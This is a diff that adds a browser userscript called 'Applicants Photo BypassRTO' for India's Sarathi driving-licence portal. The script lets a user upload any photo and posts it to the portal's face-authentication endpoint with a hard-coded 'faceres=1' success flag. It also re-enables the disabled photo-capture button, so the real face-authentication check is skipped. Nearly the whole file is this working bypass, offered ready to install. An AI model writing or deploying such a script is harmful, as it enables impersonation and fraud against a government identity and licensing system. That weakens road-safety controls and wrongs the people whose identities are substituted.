@@ -1,0 +1,260 @@
+// ==UserScript==
+// @name         Applicants Photo BypassRTO TAMPER
+// @version      3.10.0
+// @description  Adds face authentication button with animated alert messages at top center
+// @match        https://sarathi.parivahan.gov.in/sarathiservice/authenticationaction.do*
+// @run-at       document-end
+// @grant        none
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    // Function to show animated alert at top center
+    function showAlert(message, isError = false) {
+        const alertBox = document.createElement('div');
+        alertBox.innerText = message;
+        Object.assign(alertBox.style, {
+            position: 'fixed',
+            top: '20px',
+            left: '50%',
+            transform: 'translateX(-50%)',
+            background: isError ? '#ff4d4d' : '#4CAF50',
+            color: '#fff',
+            padding: '10px 20px',
+            borderRadius: '8px',
+            boxShadow: '0 4px 8px rgba(0,0,0,0.2)',
+            fontSize: '18px', // Increased font size
+            opacity: '0',
+            transition: 'opacity 0.5s ease, transform 0.5s ease',
+            zIndex: '99999',
+        });
+        document.body.appendChild(alertBox);
+
+        // Animate fade in
+        setTimeout(() => {
+            alertBox.style.opacity = '1';
+            alertBox.style.transform = 'translateX(-50%) translateY(0)';
+        }, 50);
+
+        // Fade out after 10 seconds
+        setTimeout(() => {
+            alertBox.style.opacity = '0';
+            alertBox.style.transform = 'translateX(-50%) translateY(-20px)';
+        }, 10000);
+
+        // Remove after fade out
+        setTimeout(() => {
+            alertBox.remove();
+        }, 10500);
+    }
+
+    // Function to enable button with ID "capphto1"
+    function enableCapPho1() {
+        const btn = document.getElementById("capphto1");
+        if (btn) {
+            btn.disabled = false;
+            btn.style.opacity = "1";
+            btn.style.cursor = "pointer";
+        } else {
+            setTimeout(enableCapPho1, 500);
+        }
+    }
+
+    window.addEventListener('load', () => {
+        // Create face authentication button
+        const btn = document.createElement('button');
+        btn.innerText = "🚀 Pass Auth Data";
+        Object.assign(btn.style, {
+            position: "fixed",
+            bottom: "20px",
+            right: "20px",
+            padding: "10px 16px",
+            background: "#00cc66",
+            color: "white",
+            fontWeight: "bold",
+            border: "2px solid #006633",
+            borderRadius: "8px",
+            cursor: "pointer",
+            zIndex: "99999",
+        });
+        btn.title = "Click to send face auth data automatically";
+        document.body.appendChild(btn);
+
+        // Create smaller image preview container
+        const previewContainer = document.createElement('div');
+        Object.assign(previewContainer.style, {
+            position: "fixed",
+            bottom: "70px",
+            right: "20px",
+            maxWidth: "150px",
+            maxHeight: "150px",
+            overflow: "hidden",
+            border: "2px solid #006633",
+            borderRadius: "8px",
+            background: "#fff",
+            padding: "5px",
+            zIndex: "99999",
+            display: "none",
+            cursor: "pointer",
+        });
+
+        const imgPreview = document.createElement('img');
+        imgPreview.style.width = "100%";
+        imgPreview.style.height = "auto";
+        previewContainer.appendChild(imgPreview);
+        document.body.appendChild(previewContainer);
+
+        // Create hidden file input
+        const fileInput = document.createElement('input');
+        fileInput.type = "file";
+        fileInput.accept = "image/*";
+        fileInput.style.display = "none";
+        document.body.appendChild(fileInput);
+
+        // Resize image to 200x300
+        function resizeImage(file, callback) {
+            const reader = new FileReader();
+            reader.onload = () => {
+                const img = new Image();
+                img.onload = () => {
+                    const canvas = document.createElement('canvas');
+                    const targetWidth = 200;
+                    const targetHeight = 300;
+                    canvas.width = targetWidth;
+                    canvas.height = targetHeight;
+                    const ctx = canvas.getContext('2d');
+
+                    ctx.drawImage(img, 0, 0, targetWidth, targetHeight);
+                    const resizedDataUrl = canvas.toDataURL('image/png');
+                    callback(resizedDataUrl);
+                };
+                img.src = reader.result;
+            };
+            reader.readAsDataURL(file);
+        }
+
+        // Update preview
+        function updatePreview() {
+            if (window.applimg) {
+                imgPreview.src = window.applimg;
+                previewContainer.style.display = "block";
+            }
+        }
+
+        // Check for existing image
+        const checkInterval = setInterval(() => {
+            if (window.applimg) {
+                updatePreview();
+                clearInterval(checkInterval);
+            }
+        }, 1000);
+        updatePreview();
+
+        // Clicking on the preview opens file dialog
+        previewContainer.addEventListener('click', () => {
+            fileInput.click();
+        });
+
+        // Handle file upload with resize
+        fileInput.addEventListener('change', () => {
+            const file = fileInput.files[0];
+            if (file && file.type.startsWith('image/')) {
+                resizeImage(file, (resizedDataUrl) => {
+                    window.applimg = resizedDataUrl;
+                    updatePreview();
+                });
+            } else {
+                showAlert("Please select a valid image file", true);
+            }
+        });
+
+        // Button click handler for face authentication
+        btn.addEventListener("click", async () => {
+            console.log("🔄 Send button clicked — starting FaceAuth request...");
+
+            if (typeof window.applimg === 'undefined' || !window.applimg) {
+                showAlert("⚠️ Image data (applimg) not found yet. Please ensure the page has fully loaded and the image is available.", true);
+                return;
+            }
+
+            // Show the image preview
+            updatePreview();
+
+            const applno = document.getElementById('llappln')?.value || '';
+            const rtocode = document.getElementById('rtocode')?.value || '';
+            const capPho = window.applimg;
+
+            if (!applno || !rtocode || !capPho) {
+                showAlert("❌ Missing one or more required fields", true);
+                console.log({ applno, rtocode, capPhoLen: capPho?.length });
+                return;
+            }
+
+            try {
+                (async function restoreOriginalFlow() {
+                   console.log("Restoring original face-aware flow");
+                    if (typeof faceAuthStatus === "function") {
+                        try {
+                            await faceAuthStatus();
+                            console.log("faceAuthStatus completed");
+                        } catch (e) {
+                            console.error("faceAuthStatus failed:", e);
+                        }
+                    }
+                })();
+
+                const data = new URLSearchParams();
+                data.append("applno", applno);
+                data.append("rtocode", rtocode);
+                data.append("faceres", "1");
+                data.append("CapPho", capPho);
+
+                const response = await fetch("/sarathiservice/saveFaceAuthData.do", {
+                    method: "POST",
+                    credentials: "same-origin",
+                    headers: {
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "X-Requested-With": "XMLHttpRequest",
+                        "Accept": "*/*",
+                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                        "Origin": "https://sarathi.parivahan.gov.in",
+                        "Referer": "https://sarathi.parivahan.gov.in/sarathiservice/stallexamaction.do",
+                    },
+                    body: data.toString()
+                });
+
+                const json = await response.json();
+                console.log("✅ Server Response:", json);
+
+                // Show server response
+                let old = document.getElementById("customResponseBox");
+                if (old) old.remove();
+                const pre = document.createElement("pre");
+                pre.id = "customResponseBox";
+                Object.assign(pre.style, {
+                    position: "fixed",
+                    bottom: "70px",
+                    right: "20px",
+                    maxHeight: "300px",
+                    overflow: "auto",
+                    background: "#111",
+                    color: "#0f0",
+                    padding: "10px",
+                    zIndex: "99999",
+                    border: "2px solid #0f0",
+                });
+                pre.innerText = JSON.stringify(json, null, 2);
+                document.body.appendChild(pre);
+
+                showAlert("✅ FaceAuth request sent successfully!");
+            } catch (err) {
+                console.error("❌ Error during Face Auth Request:", err);
+                showAlert("❌ Error sending request. Check console for details.", true);
+            }
+        });
+
+        // Automatic call to enableCapPho1() after 1 second
+        setTimeout(enableCapPho1, 1000);
+    });
+})();
